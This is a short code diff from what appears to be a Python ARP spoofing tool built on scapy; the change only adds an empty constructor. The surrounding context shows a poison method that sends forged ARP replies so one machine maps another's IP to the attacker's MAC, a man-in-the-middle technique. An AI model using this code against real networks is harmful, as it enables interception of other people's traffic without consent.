@@ -7,6 +7,9 @@ class Arp:
     dns_mac = ''
     first_call = True
 
+    def __init__(self):
+        return
+
     def poison(self, machine_a_ip, machine_a_mac, machine_b_ip, machine_b_mac):
         # Poison machine A's ARP cache (tell machine B is at attacker's MAC)
         send(ARP(op=2, pdst=machine_a_ip, psrc=machine_b_ip, hwdst=machine_a_mac), verbose=False)
